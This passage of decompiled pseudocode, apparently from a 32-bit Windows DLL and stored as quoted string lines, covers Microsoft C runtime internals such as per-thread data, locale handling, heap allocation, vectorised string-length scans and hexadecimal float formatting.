    "  __crt_seh_guarded_call<void>::operator()<_lambda_38edbb1296d33220d7e4dd0ed76b244a_,_lambda_5ce1d447e08cb34b2473517608e21441_ &,_lambda_fb385d3da700c9147fc39e65dd577a8c_>(",
    "    &v2,",
    "    (int)&v3,",
    "    &v4);",
    "  v3 = &a1;",
    "  v2 = 4;",
    "  v4 = 4;",
    "  __crt_seh_guarded_call<void>::operator()<_lambda_6affb1475c98b40b75cdec977db92e3c_,_lambda_b8d4b9c228a6ecc3f80208dbb4b4a104_ &,_lambda_608742c3c92a14382c1684fc64f96c88_>(",
    "    &v4,",
    "    (struct __acrt_ptd *const **)&v3,",
    "    &v2);",
    "}",
    "",
    "",
    "struct __acrt_ptd *sub_1001FE75()",
    "{",
    "  DWORD LastError; // edi",
    "  struct __acrt_ptd *v2; // eax",
    "  struct __acrt_ptd *v3; // esi",
    "  struct __acrt_ptd *v4; // ebx",
    "",
    "  LastError = GetLastError();",
    "  if ( sub_10021DB7(dword_1003F1A0, -1) )",
    "  {",
    "    v2 = (struct __acrt_ptd *)sub_10023CF0(1, 868);",
    "    v3 = v2;",
    "    if ( v2 )",
    "    {",
    "      if ( sub_10021DB7(dword_1003F1A0, v2) )",
    "      {",
    "        construct_ptd(v3, &dword_10040368);",
    "        _free_base(0);",
    "        v4 = v3;",
    "      }",
    "      else",
    "      {",
    "        v4 = 0;",
    "        sub_10021DB7(dword_1003F1A0, 0);",
    "        _free_base(v3);",
    "      }",
    "      SetLastError(LastError);",
    "      return v4;",
    "    }",
    "    else",
    "    {",
    "      sub_10021DB7(dword_1003F1A0, 0);",
    "      _free_base(0);",
    "      SetLastError(LastError);",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    SetLastError(LastError);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "void __cdecl replace_current_thread_locale_nolock(struct __acrt_ptd *const a1, struct __crt_locale_data *const a2)",
    "{",
    "  int v2; // eax",
    "",
    "  if ( *((_DWORD *)a1 + 19) )",
    "  {",
    "    __acrt_release_locale_ref(*((_DWORD *)a1 + 19));",
    "    v2 = *((_DWORD *)a1 + 19);",
    "    if ( (struct __crt_locale_data *)v2 != dword_10040368 && (wchar_t **)v2 != &off_1003F1A8 && !*(_DWORD *)(v2 + 12) )",
    "      sub_10025486(*((void **)a1 + 19));",
    "  }",
    "  *((_DWORD *)a1 + 19) = a2;",
    "  if ( a2 )",
    "    __acrt_add_locale_ref(a2);",
    "}",
    "",
    "",
    "void sub_1001FF68()",
    "{",
    "  struct __acrt_ptd *v0; // esi",
    "",
    "  if ( dword_1003F1A0 != -1 )",
    "  {",
    "    v0 = (struct __acrt_ptd *)sub_10021DAB(dword_1003F1A0);",
    "    if ( v0 )",
    "    {",
    "      sub_10021DB7(dword_1003F1A0, 0);",
    "      destroy_fls(v0);",
    "    }",
    "  }",
    "}",
    "",
    "",
    "int sub_1001FFAC()",
    "{",
    "  int result; // eax",
    "",
    "  result = sub_1001FFFD();",
    "  if ( !result )",
    "    abort();",
    "  return result;",
    "}",
    "",
    "",
    "struct __acrt_ptd *sub_1001FFBA()",
    "{",
    "  struct __acrt_ptd *result; // eax",
    "",
    "  if ( dword_1003F1A0 != -1 )",
    "  {",
    "    result = (struct __acrt_ptd *)sub_10021DAB(dword_1003F1A0);",
    "    if ( result )",
    "    {",
    "      if ( result != (struct __acrt_ptd *)-1 )",
    "        return result;",
    "LABEL_6:",
    "      abort();",
    "    }",
    "  }",
    "  result = sub_1001FE75();",
    "  if ( !result )",
    "    goto LABEL_6;",
    "  return result;",
    "}",
    "",
    "",
    "struct __acrt_ptd *sub_1001FFFD()",
    "{",
    "  struct __acrt_ptd *v0; // edi",
    "  DWORD LastError; // esi",
    "",
    "  if ( byte_10040360 )",
    "  {",
    "    if ( dword_1003F1A0 == -1 )",
    "      return sub_1001FE75();",
    "    v0 = (struct __acrt_ptd *)sub_10021D9E(dword_1003F1A0);",
    "    if ( !v0 )",
    "    {",
    "      return sub_1001FE75();",
    "    }",
    "    else if ( v0 == (struct __acrt_ptd *)-1 )",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "    if ( dword_1003F1A0 == -1 || (v0 = (struct __acrt_ptd *)sub_10021DAB(dword_1003F1A0)) == 0 )",
    "    {",
    "      v0 = sub_1001FE75();",
    "    }",
    "    else if ( v0 == (struct __acrt_ptd *)-1 )",
    "    {",
    "      v0 = 0;",
    "    }",
    "    SetLastError(LastError);",
    "  }",
    "  return v0;",
    "}",
    "",
    "",
    "char *__cdecl sub_10020089(int a1, int a2)",
    "{",
    "  int v2; // esi",
    "  struct __acrt_ptd *v3; // eax",
    "  bool v4; // zf",
    "",
    "  v2 = 0;",
    "  if ( dword_1003F1A0 == -1 || (v3 = (struct __acrt_ptd *)sub_10021DAB(dword_1003F1A0)) == 0 )",
    "  {",
    "    v3 = sub_1001FE75();",
    "    v4 = v3 == 0;",
    "  }",
    "  else",
    "  {",
    "    v4 = (struct __acrt_ptd *)((char *)v3 + 1) == 0;",
    "  }",
    "  if ( !v4 )",
    "    return (char *)v3 + 868 * a2;",
    "  return (char *)v2;",
    "}",
    "",
    "",
    "char sub_100200D2()",
    "{",
    "  byte_10040360 = sub_10021E80();",
    "  dword_1003F1A0 = sub_10021D86(destroy_fls);",
    "  if ( dword_1003F1A0 == -1 )",
    "    return 0;",
    "  if ( !sub_1001FFFD() )",
    "  {",
    "    __acrt_uninitialize_ptd(0);",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __acrt_uninitialize_ptd()",
    "{",
    "  if ( dword_1003F1A0 != -1 )",
    "  {",
    "    sub_10021D92(dword_1003F1A0);",
    "    dword_1003F1A0 = -1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_e5124f882df8998aaf41531e079ba474_,_lambda_3e16ef9562a7dcce91392c22ab16ea36_ &,_lambda_e25ca0880e6ef98be67edffd8c599615_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  __int64 *i; // esi",
    "",
    "  __acrt_lock(*a1);",
    "  for ( i = (__int64 *)&dword_10040368; i != &qword_1004036C; i = (__int64 *)((char *)i + 4) )",
    "  {",
    "    if ( *(wchar_t ***)i != &off_1003F1A8 )",
    "      *(_DWORD *)i = _updatetlocinfoEx_nolock(i, &off_1003F1A8);",
    "  }",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "__int32 sub_10020190()",
    "{",
    "  return _InterlockedExchange(&dword_10040364, 1);",
    "}",
    "",
    "",
    "int __acrt_uninitialize_locale()",
    "{",
    "  int v1; // [esp+0h] [ebp-Ch] BYREF",
    "  int v2; // [esp+4h] [ebp-8h] BYREF",
    "  char v3; // [esp+Bh] [ebp-1h] BYREF",
    "",
    "  v2 = 4;",
    "  v1 = 4;",
    "  return __crt_seh_guarded_call<void>::operator()<_lambda_e5124f882df8998aaf41531e079ba474_,_lambda_3e16ef9562a7dcce91392c22ab16ea36_ &,_lambda_e25ca0880e6ef98be67edffd8c599615_>(",
    "           &v1,",
    "           (int)&v3,",
    "           &v2);",
    "}",
    "",
    "",
    "struct __crt_locale_data *__cdecl sub_100201C2(int a1, struct __crt_locale_data **a2)",
    "{",
    "  struct __crt_locale_data *result; // eax",
    "",
    "  result = *a2;",
    "  if ( *a2 != dword_10040368 )",
    "  {",
    "    result = (struct __crt_locale_data *)dword_1003FAB8;",
    "    if ( (dword_1003FAB8 & *(_DWORD *)(a1 + 848)) == 0 )",
    "    {",
    "      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_100201EF(int a1, int *a2, int a3)",
    "{",
    "  int result; // eax",
    "",
    "  result = a3;",
    "  if ( (struct __crt_locale_data *)*a2 != *(&dword_10040368 + a3) )",
    "  {",
    "    result = dword_1003FAB8;",
    "    if ( (dword_1003FAB8 & *(_DWORD *)(a1 + 848)) == 0 )",
    "    {",
    "      result = __acrt_update_thread_locale_data();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "struct __crt_multibyte_data *__cdecl sub_10020220(int a1, struct __crt_multibyte_data **a2)",
    "{",
    "  struct __crt_multibyte_data *result; // eax",
    "",
    "  result = *a2;",
    "  if ( *a2 != dword_10040844 )",
    "  {",
    "    result = (struct __crt_multibyte_data *)dword_1003FAB8;",
    "    if ( (dword_1003FAB8 & *(_DWORD *)(a1 + 848)) == 0 )",
    "    {",
    "      result = (struct __crt_multibyte_data *)sub_10024B37();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1002024D(int a1, int *a2, int a3)",
    "{",
    "  int result; // eax",
    "",
    "  result = a3;",
    "  if ( (struct __crt_multibyte_data *)*a2 != *(&dword_10040844 + a3) )",
    "  {",
    "    result = dword_1003FAB8;",
    "    if ( (dword_1003FAB8 & *(_DWORD *)(a1 + 848)) == 0 )",
    "    {",
    "      result = sub_10024B37();",
    "      *a2 = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl _free_base(void *Block)",
    "{",
    "  DWORD LastError; // eax",
    "  int v2; // esi",
    "",
    "  if ( Block )",
    "  {",
    "    if ( !HeapFree(hHeap, 0, Block) )",
    "    {",
    "      LastError = GetLastError();",
    "      v2 = sub_1001DF6A(LastError);",
    "      *(_DWORD *)sub_1001E025() = v2;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "HANDLE sub_100202C0()",
    "{",
    "  return hHeap;",
    "}",
    "",
    "",
    "LPVOID __cdecl sub_100202D0(unsigned int a1)",
    "{",
    "  SIZE_T v1; // esi",
    "  LPVOID result; // eax",
    "",
    "  v1 = a1;",
    "  if ( a1 > 0xFFFFFFE0 )",
    "  {",
    "LABEL_9:",
    "    *(_DWORD *)sub_1001E025() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    if ( !a1 )",
    "      v1 = 1;",
    "    while ( 1 )",
    "    {",
    "      result = HeapAlloc(hHeap, 0, v1);",
    "      if ( result )",
    "        break;",
    "      if ( !sub_10025B20() || !_callnewh(v1) )",
    "        goto LABEL_9;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__cdecl sub_10020321(__m128i *a1, unsigned int a2)",
    "{",
    "  __m128i *v3; // esi",
    "  unsigned int v4; // edi",
    "  _BYTE *v5; // edx",
    "  __m128i *v6; // edx",
    "  int v7; // edi",
    "  __m128i *v10; // eax",
    "  __m128i *v11; // esi",
    "  unsigned int v12; // edi",
    "  int v13; // edi",
    "  __m128i *i; // edx",
    "",
    "  if ( dword_1004014C < 5 )",
    "  {",
    "    if ( dword_1004014C < 1 )",
    "    {",
    "      for ( i = a1; i != (__m128i *)&a1->m128i_i8[a2]; i = (__m128i *)((char *)i + 1) )",
    "      {",
    "        if ( !i->m128i_i8[0] )",
    "          break;",
    "      }",
    "      return (_BYTE *)((char *)i - (char *)a1);",
    "    }",
    "    else",
    "    {",
    "      v11 = a1;",
    "      v12 = ((unsigned __int8)a1 & 0xF) != 0 ? 16 - ((unsigned __int8)a1 & 0xF) : 0;",
    "      if ( a2 < v12 )",
    "        v12 = a2;",
    "      if ( a1 != (__m128i *)&a1->m128i_i8[v12] )",
    "      {",
    "        do",
    "        {",
    "          if ( !v11->m128i_i8[0] )",
    "            break;",
    "          v11 = (__m128i *)((char *)v11 + 1);",
    "        }",
    "        while ( v11 != (__m128i *)&a1->m128i_i8[v12] );",
    "      }",
    "      v5 = (_BYTE *)((char *)v11 - (char *)a1);",
    "      if ( (char *)v11 - (char *)a1 == v12 )",
    "      {",
    "        v6 = v11;",
    "        v13 = (int)v11->m128i_i32 + a2 - v12 - (((_BYTE)a2 - (_BYTE)v12) & 0xF);",
    "        if ( v11 != (__m128i *)v13 )",
    "        {",
    "          do",
    "          {",
    "            if ( _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *v6)) )",
    "              break;",
    "            ++v6;",
    "          }",
    "          while ( v6 != (__m128i *)v13 );",
    "        }",
    "        v10 = a1;",
    "        while ( v6 != (__m128i *)&a1->m128i_i8[a2] && v6->m128i_i8[0] )",
    "          v6 = (__m128i *)((char *)v6 + 1);",
    "        return (_BYTE *)((char *)v6 - (char *)v10);",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v3 = a1;",
    "    v4 = ((unsigned __int8)a1 & 0x1F) != 0 ? 32 - ((unsigned __int8)a1 & 0x1F) : 0;",
    "    if ( a2 < v4 )",
    "      v4 = a2;",
    "    if ( a1 != (__m128i *)&a1->m128i_i8[v4] )",
    "    {",
    "      do",
    "      {",
    "        if ( !v3->m128i_i8[0] )",
    "          break;",
    "        v3 = (__m128i *)((char *)v3 + 1);",
    "      }",
    "      while ( v3 != (__m128i *)&a1->m128i_i8[v4] );",
    "    }",
    "    v5 = (_BYTE *)((char *)v3 - (char *)a1);",
    "    if ( (char *)v3 - (char *)a1 == v4 )",
    "    {",
    "      v6 = v3;",
    "      v7 = (int)v3->m128i_i32 + a2 - v4 - (((_BYTE)a2 - (_BYTE)v4) & 0x1F);",
    "      if ( v3 != (__m128i *)v7 )",
    "      {",
    "        do",
    "        {",
    "          __asm",
    "          {",
    "            vpxor   xmm1, xmm1, xmm1",
    "            vpcmpeqb ymm0, ymm1, ymmword ptr [edx]",
    "            vpmovmskb eax, ymm0",
    "          }",
    "          __asm { vzeroupper }",
    "          if ( _EAX )",
    "            break;",
    "          v6 += 2;",
    "        }",
    "        while ( v6 != (__m128i *)v7 );",
    "      }",
    "      v10 = a1;",
    "      while ( v6 != (__m128i *)&a1->m128i_i8[a2] && v6->m128i_i8[0] )",
    "        v6 = (__m128i *)((char *)v6 + 1);",
    "      return (_BYTE *)((char *)v6 - (char *)v10);",
    "    }",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "int __cdecl sub_10020456(char *a1, unsigned int a2)",
    "{",
    "  char *v3; // edx",
    "  char *v4; // esi",
    "  unsigned int v5; // esi",
    "  char *v6; // edi",
    "  int v7; // edx",
    "  __m128i *v8; // edi",
    "  unsigned int v9; // ecx",
    "  char *v10; // esi",
    "  __m128i *j; // ecx",
    "  __m128i *k; // ecx",
    "  int v15; // edx",
    "  char *v16; // esi",
    "  unsigned int v17; // esi",
    "  char *v18; // edi",
    "  unsigned int v19; // ecx",
    "  __m128i *v20; // ecx",
    "  __m128i *i; // ecx",
    "  char *v22; // esi",
    "",
    "  v3 = a1;",
    "  if ( dword_1004014C < 5 )",
    "  {",
    "    if ( dword_1004014C < 1 )",
    "    {",
    "      v22 = &a1[2 * a2];",
    "      if ( a1 != v22 )",
    "      {",
    "        do",
    "        {",
    "          if ( !*(_WORD *)v3 )",
    "            break;",
    "          v3 += 2;",
    "        }",
    "        while ( v3 != v22 );",
    "      }",
    "      goto LABEL_43;",
    "    }",
    "    if ( ((unsigned __int8)a1 & 1) != 0 )",
    "    {",
    "      v16 = &a1[2 * a2];",
    "      if ( a1 != v16 )",
    "      {",
    "        do",
    "        {",
    "          if ( !*(_WORD *)v3 )",
    "            break;",
    "          v3 += 2;",
    "        }",
    "        while ( v3 != v16 );",
    "      }",
    "      goto LABEL_43;",
    "    }",
    "    v17 = ((16 - ((unsigned __int8)a1 & 0xF)) & (unsigned int)-(((unsigned __int8)a1 & 0xF) != 0)) >> 1;",
    "    if ( a2 < v17 )",
    "      v17 = a2;",
    "    v18 = &a1[2 * v17];",
    "    if ( a1 != v18 )",
    "    {",
    "      do",
    "      {",
    "        if ( !*(_WORD *)v3 )",
    "          break;",
    "        v3 += 2;",
    "      }",
    "      while ( v3 != v18 );",
    "    }",
    "    v7 = (v3 - a1) >> 1;",
    "    if ( v7 == v17 )",
    "    {",
    "      v8 = (__m128i *)&a1[2 * v7];",
    "      v19 = a2 - v17;",
    "      v10 = a1;",
    "      v20 = (__m128i *)&a1[2 * v7 + 2 * (v19 - (v19 & 0xF))];",
    "      while ( v8 != v20 && !_mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *v8)) )",
    "        ++v8;",
    "      for ( i = (__m128i *)&a1[2 * a2]; v8 != i; v8 = (__m128i *)((char *)v8 + 2) )",
    "      {",
    "        if ( !v8->m128i_i16[0] )",
    "          break;",
    "      }",
    "      goto LABEL_19;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( ((unsigned __int8)a1 & 1) != 0 )",
    "    {",
    "      v4 = &a1[2 * a2];",
    "      if ( a1 != v4 )",
    "      {",
    "        do",
    "        {",
    "          if ( !*(_WORD *)v3 )",
    "            break;",
    "          v3 += 2;",
    "        }",
    "        while ( v3 != v4 );",
    "      }",
    "LABEL_43:",
    "      v15 = v3 - a1;",
    "      return v15 >> 1;",
    "    }",
    "    v5 = ((32 - ((unsigned __int8)a1 & 0x1F)) & (unsigned int)-(((unsigned __int8)a1 & 0x1F) != 0)) >> 1;",
    "    if ( a2 < v5 )",
    "      v5 = a2;",
    "    v6 = &a1[2 * v5];",
    "    if ( a1 != v6 )",
    "    {",
    "      do",
    "      {",
    "        if ( !*(_WORD *)v3 )",
    "          break;",
    "        v3 += 2;",
    "      }",
    "      while ( v3 != v6 );",
    "    }",
    "    v7 = (v3 - a1) >> 1;",
    "    if ( v7 == v5 )",
    "    {",
    "      v8 = (__m128i *)&a1[2 * v7];",
    "      v9 = a2 - v5;",
    "      v10 = a1;",
    "      for ( j = (__m128i *)&a1[2 * v7 + 2 * (v9 - (v9 & 0x1F))]; v8 != j; v8 += 2 )",
    "      {",
    "        __asm",
    "        {",
    "          vpxor   xmm1, xmm1, xmm1",
    "          vpcmpeqw ymm0, ymm1, ymmword ptr [edi]",
    "          vpmovmskb eax, ymm0",
    "        }",
    "        __asm { vzeroupper }",
    "        if ( _EAX )",
    "          break;",
    "      }",
    "      for ( k = (__m128i *)&a1[2 * a2]; v8 != k; v8 = (__m128i *)((char *)v8 + 2) )",
    "      {",
    "        if ( !v8->m128i_i16[0] )",
    "          break;",
    "      }",
    "LABEL_19:",
    "      v15 = (char *)v8 - v10;",
    "      return v15 >> 1;",
    "    }",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "int __cdecl __acrt_fp_classify(int *a1)",
    "{",
    "  int v1; // edi",
    "  int v2; // edx",
    "",
    "  v1 = *a1;",
    "  v2 = a1[1];",
    "  if ( (((unsigned int)v2 >> 20) & 0x7FF) != 0x7FF )",
    "    return 0;",
    "  if ( !(v2 & 0xFFFFF | v1) )",
    "    return 1;",
    "  if ( v2 < 0 && !v1 && (v2 & 0xFFFFF) == 0x80000 )",
    "    return 4;",
    "  if ( (v2 & 0x80000) != 0 )",
    "    return 2;",
    "  return 3;",
    "}",
    "",
    "",
    "char __cdecl fe_to_nearest(const double *a1, unsigned __int64 a2, __int16 a3)",
    "{",
    "  unsigned __int64 v3; // rdi",
    "  unsigned __int16 v4; // ax",
    "  int v6; // ecx",
    "  char v7; // bl",
    "  int v8; // edx",
    "  unsigned __int64 v9; // rax",
    "",
    "  v3 = *(_QWORD *)a1;",
    "  v4 = (a2 & *(_QWORD *)a1 & 0xFFFFFFFFFFFFFLL) >> a3;",
    "  if ( v4 > 8u )",
    "    return 1;",
    "  if ( v4 < 8u )",
    "    return 0;",
    "  v6 = 0;",
    "  v7 = 0;",
    "  if ( (unsigned int)a3 >= 0x20 )",
    "    v6 = 1 << a3;",
    "  v8 = v6 ^ (1 << a3);",
    "  if ( (unsigned int)a3 >= 0x40 )",
    "    v6 ^= 1 << a3;",
    "  if ( HIDWORD(v3) & ((__PAIR64__(v6, v8) - 1) >> 32) & 0xFFFFF | (unsigned int)v3 & (v8 - 1) )",
    "    return 1;",
    "  if ( a3 == 48 )",
    "  {",
    "    if ( (v3 & 0x7FF0000000000000LL) != 0 )",
    "      v7 = 1;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v9) = a2 & (v3 >> 4);",
    "    HIDWORD(v9) = (unsigned __int16)(WORD2(a2) & (HIDWORD(v3) >> 4));",
    "    v7 = v9 >> a3;",
    "  }",
    "  return v7 & 1;",
    "}",
    "",
    "",
    "int __cdecl sub_10020720(",
    "        _DWORD *a1,",
    "        char *Str,",
    "        rsize_t a3,",
    "        int a4,",
    "        rsize_t a5,",
    "        signed int Size,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10)",
    "{",
    "  signed int v10; // esi",
    "  char *v11; // edi",
    "  int result; // eax",
    "  _QWORD *v13; // ebx",
    "  char *v14; // eax",
    "  char *v15; // edx",
    "  char *v16; // edi",
    "  char v17; // al",
    "  __crt_cached_ptd_host *v18; // eax",
    "  int v19; // ecx",
    "  unsigned int v20; // eax",
    "  unsigned __int64 v21; // rax",
    "  unsigned int v22; // eax",
    "  unsigned __int16 v23; // dx",
    "  char *i; // eax",
    "  char v25; // cl",
    "  _BYTE *v26; // ecx",
    "  unsigned int v27; // ebx",
    "  int v28; // esi",
    "  char v29; // al",
    "  _BYTE *v30; // edi",
    "  __int64 v31; // rcx",
    "  __int64 v32; // kr08_8",
    "  signed __int64 v33; // [esp-18h] [ebp-4Ch]",
    "  _BYTE *v34; // [esp+10h] [ebp-24h]",
    "  unsigned int v35; // [esp+18h] [ebp-1Ch]",
    "  unsigned int v36; // [esp+1Ch] [ebp-18h]",
    "  int v37; // [esp+24h] [ebp-10h]",
    "  char *v38; // [esp+28h] [ebp-Ch]",
    "  unsigned __int16 v39; // [esp+2Ch] [ebp-8h]",
    "",
    "  v10 = 0;",
    "  if ( Size >= 0 )",
    "    v10 = Size;",
    "  v11 = Str;",
    "  *Str = 0;",
    "  if ( a3 <= v10 + 11 )",
    "  {",
    "    *((_BYTE *)a10 + 28) = 1;",
    "    *((_DWORD *)a10 + 6) = 34;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a10);",
    "    return 34;",
    "  }",
    "  v13 = a1;",
    "  if ( ((a1[1] >> 20) & 0x7FF) != 0x7FF )",
    "  {",
    "    if ( (int)a1[1] < 0 )",
    "    {",
    "      *Str = 45;",
    "      v11 = Str + 1;",
    "    }",
    "    v15 = v11 + 1;",
    "    v37 = 1023;",
    "    v38 = v11 + 1;",
    "    if ( (a1[1] & 0x7FF00000) != 0 )",
    "    {",
    "      *v11 = 49;",
    "    }",
    "    else",
    "    {",
    "      *v11 = 48;",
    "      if ( a1[1] & 0xFFFFF | *a1 )",
    "        v37 = 1022;",
    "      else",
    "        v37 = 0;",
    "    }",
    "    v16 = v11 + 2;",
    "    if ( v10 )",
    "    {",
    "      v18 = a10;",
    "      if ( !*((_BYTE *)a10 + 20) )",
    "      {",
    "        __crt_cached_ptd_host::update_locale_slow(a10);",
    "        v18 = a10;",
    "        v15 = v38;",
    "      }",
    "      v17 = ***(_BYTE ***)(*((_DWORD *)v18 + 3) + 136);",
    "    }",
    "    else",
    "    {",
    "      v17 = 0;",
    "    }",
    "    *v15 = v17;",
    "    if ( (a1[1] & 0xFFFFF) != 0 || *a1 )",
    "    {",
    "      v39 = 48;",
    "      v19 = 983040;",
    "      v20 = 0;",
    "      v35 = 983040;",
    "      v36 = 0;",
    "      while ( 1 )",
    "      {",
    "        v13 = a1;",
    "        if ( v10 <= 0 )",
    "          break;",
    "        LODWORD(v21) = *a1 & v20;",
    "        HIDWORD(v21) = v19 & a1[1] & 0xFFFFF;",
    "        v22 = (unsigned __int16)((v21 >> v39) + 48);",
    "        if ( v22 > 0x39 )",
    "          LOBYTE(v22) = 32 * (a7 ^ 1) + 7 + v22;",
    "        v23 = v39;",
    "        *v16++ = v22;",
    "        v20 = __PAIR64__(v35, v36) >> 4;",
    "        v39 -= 4;",
    "        v19 = v35 >> 4;",
    "        --v10;",
    "        v36 = v20;",
    "        v35 >>= 4;",
    "        if ( (__int16)(v23 - 4) < 0 )",
    "          goto LABEL_40;",
    "      }",
    "      if ( !(unsigned __int8)should_round_up(a1, v20, v19, v39, a9) )",
    "      {",
    "LABEL_42:",
    "        if ( !*v38 )",
    "          v16 = v38;",
    "        *v16 = 32 * (a7 ^ 1) + 80;",
    "        v26 = v16 + 2;",
    "        v34 = v16 + 2;",
    "        v28 = (((*v13 >> 52) & 0x7FFLL) - (unsigned __int64)(unsigned int)v37) >> 32;",
    "        v27 = ((*v13 >> 52) & 0x7FF) - v37;",
    "        if ( v28 < 0 )",
    "        {",
    "          v27 = -v27;",
    "          v28 = (unsigned __int64)-__SPAIR64__(v28, v27) >> 32;",
    "          v29 = 45;",
    "        }",
    "        else",
    "        {",
    "          v29 = 43;",
    "        }",
    "        v16[1] = v29;",
    "        v30 = v16 + 2;",
    "        *v26 = 48;",
    "        if ( v28 < 0 )",
    "          goto LABEL_59;",
    "        if ( v28 <= 0 && v27 < 0x3E8",
    "          || (v33 = __PAIR64__(v28, v27),",
    "              v31 = __SPAIR64__(v28, v27) % 1000,",
    "              v28 = HIDWORD(v31),",
    "              v27 = v31,",
    "              v30 = v34 + 1,",
    "              *v34 = v33 / 1000 + 48,",
    "              v34 + 1 == v34) )",
    "        {",
    "          if ( v28 < 0 )",
    "          {",
    "LABEL_59:",
    "            *v30 = v27 + 48;",
    "            v30[1] = 0;",
    "            return 0;",
    "          }",
    "          if ( v28 <= 0 && v27 < 0x64 )",
    "            goto LABEL_57;",
    "        }",
    "        *v30++ = __SPAIR64__(v28, v27) / 100 + 48;",
    "        v32 = __SPAIR64__(v28, v27) % 100;",
    "        v28 = (unsigned __int64)(__SPAIR64__(v28, v27) % 100) >> 32;",
    "        v27 = v32;",
    "        if ( v30 == v34 )",
    "        {",
    "LABEL_57:",
    "          if ( v28 < 0 || v28 <= 0 && v27 < 0xA )",
    "            goto LABEL_59;",
    "        }",
    "        *v30++ = __SPAIR64__(v28, v27) / 10 + 48;",
    "        LOBYTE(v27) = __SPAIR64__(v28, v27) % 10;",
    "        goto LABEL_59;",
    "      }",
    "      for ( i = v16 - 1; ; --i )",
    "      {",
    "        v25 = *i;",
    "        if ( *i != 102 && v25 != 70 )",
    "          break;",
    "        *i = 48;",
    "      }",
    "      v13 = a1;",
    "      if ( i == v38 )",
    "      {",
    "        ++*(i - 1);",
    "      }",
    "      else",
    "      {",
    "        if ( v25 == 57 )",
    "          v25 = 32 * (a7 ^ 1) + 64;",
    "        *i = v25 + 1;",
    "      }",
    "    }",
    "LABEL_40:",
    "    if ( v10 > 0 )",
    "    {",
    "      memset(v16, 48, v10);",
    "      v16 += v10;",
    "    }",
    "    goto LABEL_42;",
    "  }",
    "  result = sub_10020A5C(a1, Str, a3, a4, a5, v10, 0, a8, a9, a10);",
    "  if ( result )",
    "  {",
    "    *Str = 0;",
    "    return result;",
    "  }",
    "  v14 = strrchr(Str, 101);",
    "  if ( v14 )",
    "  {",
    "    *v14 = 32 * (a7 ^ 1) + 80;",
    "    v14[3] = 0;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_10020A5C(",
    "        __int64 *a1,",
    "        char *a2,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10)",
    "{",
    "  int v10; // eax",
    "  BOOL v11; // edx",
    "  BOOL v12; // ecx",
    "  int v13; // eax",
    "  int result; // eax",
    "  int v15; // [esp-28h] [ebp-3Ch]",
    "  int v16[3]; // [esp+8h] [ebp-Ch] BYREF",
    "",
    "  v10 = sub_100261E7(*a1, a6 + 1, 1, (int)v16, a4, a5);",
    "  v11 = v16[0] == 45;",
    "  v15 = v10;",
    "  v12 = a6 > 0;",
    "  v13 = SizeInBytes - v12 - v11;",
    "  if ( SizeInBytes == -1 )",
    "    v13 = -1;",
    "  result = __acrt_fp_strflt_to_string(&a2[v12 + v11], v13, a6 + 1, (int)v16, v15, a9, a10);",
    "  if ( !result )",
    "    return sub_10020AEC(a2, SizeInBytes, a6, a7, a8, (int)v16, 0, a10);",
    "  *a2 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_10020AEC(",
    "        char *a1,",
    "        rsize_t SizeInBytes,",
    "        int a3,",
    "        char a4,",
    "        int a5,",
    "        int a6,",
    "        unsigned __int8 a7,",
    "        __crt_cached_ptd_host *a8)",
    "{",
    "  int v8; // eax",
    "  char *v10; // esi",
    "  __crt_cached_ptd_host *v11; // eax",
    "  char *v12; // esi",
    "  rsize_t v13; // edi",
    "  int v14; // edx",
    "  int v15; // eax",
    "  int v16; // eax",
    "",
    "  v8 = 0;",
    "  if ( a3 > 0 )",
    "    v8 = a3;",
    "  if ( SizeInBytes > v8 + 9 )",
    "  {",
    "    if ( a7 )",
    "      shift_bytes(a1, SizeInBytes, &a1[*(_DWORD *)a6 == 45], a3 > 0);",
    "    v10 = a1;",
    "    if ( *(_DWORD *)a6 == 45 )",
    "    {",
    "      *a1 = 45;",
    "      v10 = a1 + 1;",
    "    }",
    "    if ( a3 > 0 )",
    "    {",
    "      *v10 = v10[1];",
    "      ++v10;",
    "      v11 = a8;",
    "      if ( !*((_BYTE *)a8 + 20) )",
    "      {",
    "        __crt_cached_ptd_host::update_locale_slow(a8);",
    "        v11 = a8;",
    "      }",
    "      *v10 = ***(_BYTE ***)(*((_DWORD *)v11 + 3) + 136);",
    "    }",
    "    v12 = &v10[a3 + (a7 ^ 1)];",
    "    v13 = SizeInBytes + a1 - v12;",
    "    if ( SizeInBytes == -1 )",
    "      v13 = -1;",
    "    if ( strcpy_s(v12, v13, \"e+000\") )",
